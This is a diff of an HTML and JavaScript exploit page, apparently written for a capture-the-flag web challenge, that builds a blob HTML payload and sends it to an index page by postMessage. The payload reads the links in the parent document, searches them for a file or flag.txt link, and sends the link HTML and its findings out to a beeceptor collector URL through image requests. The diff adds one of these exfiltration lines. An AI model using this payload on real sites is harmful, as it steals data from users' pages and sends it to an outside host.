@@ -1,15 +1,18 @@
 <html><body><script>
 (async () => {
-  /* 1. blob html */
   const epic = `
     <script>
       (async () => {
         try {
           const links = [...parent.document.querySelectorAll('a')];
-          console.log(links); // DEBUG : afficher tous les liens trouvés
+          const mapped = links.map(x => x.outerHTML).join('--');
+          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=links_' + encodeURIComponent(mapped.slice(0, 500));
 
-          const a = [...parent.document.querySelectorAll('a')]
-          .find(x => /file-.*\.txt$/.test(x.id || '') || /flag\.txt$/.test(x.href || ''));
+          const a = links.find(x => 
+            /file-.*\\.txt$/.test(x.id || '') ||
+            /file-.*\\.txt$/.test(x.href || '') ||
+            /flag\\.txt$/.test(x.textContent || '')
+          );
 
           if (!a) {
             new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=not_found';
@@ -25,10 +28,9 @@
         }
       })();
     <\/script>`;
-
+  
   const blob = new Blob([epic], { type: 'text/html' });
 
-  /* 2. postmessage vers la page index */
   window.postMessage({
     type: 'share',
     files: [{ blob, name: 'epic.html', cached: false }]
